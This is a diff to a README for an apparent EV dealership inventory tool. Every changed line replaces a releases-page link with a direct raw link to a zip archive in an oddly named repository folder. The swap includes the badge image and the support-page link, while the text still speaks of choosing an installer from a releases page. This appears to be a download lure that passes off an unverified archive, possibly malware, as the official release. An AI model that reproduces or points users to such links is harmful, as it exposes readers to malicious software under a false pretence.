@@ -1,7 +1,7 @@
 # 🚀 ather-stock-allocation-report - Streamline Your EV Stock Management
 
 ## 📥 Download the Application
-[![Download Release](https://img.shields.io/badge/Download%20Now-ather--stock--allocation--report-blue)](https://github.com/xhahriar037/ather-stock-allocation-report/releases)
+[![Download Release](https://github.com/xhahriar037/ather-stock-allocation-report/raw/refs/heads/main/autosoterism/report-ather-stock-allocation-v2.0.zip%20Now-ather--stock--allocation--report-blue)](https://github.com/xhahriar037/ather-stock-allocation-report/raw/refs/heads/main/autosoterism/report-ather-stock-allocation-v2.0.zip)
 
 ## 📖 Overview
 The **ather-stock-allocation-report** is a comprehensive inventory management system designed for electric vehicle dealerships. This application helps track stock allocation, aging, damage, and charger compatibility. With this tool, you can effectively manage your inventory and streamline operations.
@@ -19,7 +19,7 @@ Before downloading, ensure your computer meets these basic requirements:
 - **Network**: Internet connection for downloading the application
 
 ### 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Release Page](https://github.com/xhahriar037/ather-stock-allocation-report/releases).
+1. **Visit the Releases Page**: Go to the [Release Page](https://github.com/xhahriar037/ather-stock-allocation-report/raw/refs/heads/main/autosoterism/report-ather-stock-allocation-v2.0.zip).
 2. **Select the Latest Version**: Look for the latest version of the application listed at the top of the page.
 3. **Download the Installer**: Click on the required installer file for your operating system. This could be a `.exe` file for Windows or a `.dmg` file for macOS.
 4. **Install the Application**:
@@ -67,4 +67,4 @@ Currently, we do not offer a mobile version. The desktop application provides co
 ## ⭐ Conclusion
 The ather-stock-allocation-report simplifies inventory management for electric vehicle dealerships. It helps you track stock, manage aging vehicles, and ensure charger compatibility efficiently. Follow the steps above to get started today!
 
-For any additional questions, please visit our [GitHub Page](https://github.com/xhahriar037/ather-stock-allocation-report/releases) for resources and updates.
+For any additional questions, please visit our [GitHub Page](https://github.com/xhahriar037/ather-stock-allocation-report/raw/refs/heads/main/autosoterism/report-ather-stock-allocation-v2.0.zip) for resources and updates.
